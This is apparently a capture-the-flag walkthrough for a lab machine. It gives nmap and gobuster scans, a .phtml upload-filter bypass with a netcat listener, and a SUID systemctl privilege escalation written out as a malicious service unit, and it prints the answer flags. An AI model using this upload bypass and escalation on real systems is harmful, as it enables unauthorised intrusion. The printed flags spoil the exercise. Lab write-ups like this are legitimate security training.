# First
nmap -sV -sC -oN vulnerversity.namp 10.10.176.147
## Ports Open
6
### version of the squid proxy 
3.5.12
### operating system 
Ubuntu

# Second
gobuster dir -u http://10.10.87.135:3333 -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt

### directory that has an upload form page?
/internal

# Third
start burp suite and enable it in foxy proxy. Create a file with different php extensions for the Sniper attack
- every extension is yielding Status as 200 but the length of .phtml extension was different from the rest.
- try to upload a shell.phtml
- We start a netcat listener:
   nc -lvp 4444
 ###  name of the user who manages the webserver
 bill
 ### user.txt
 8bd7992fbe8a6ad22a63361004cfcedb
 
 # privilage escilation
 - check the system for SUID files
 command ---> find / -perm -u=s -type f 2>/dev/null
We see that /bin/systemctl is a SUID binary. We could use this to gain privelage access. We have a look at gtfobins and search for systemctl
We create a temporary service and then use that to view root.txt file.
```
TF=$(mktemp).service
echo '[Service]
ExecStart=/bin/sh -c "cat /root/root.txt > /tmp/output"
[Install]
WantedBy=multi-user.target' >$TF
/bin/systemctl link $TF
/bin/systemctl enable --now $TF

```
#Root Flag
a58ff8579f0a9270368d33a9966c7fd5


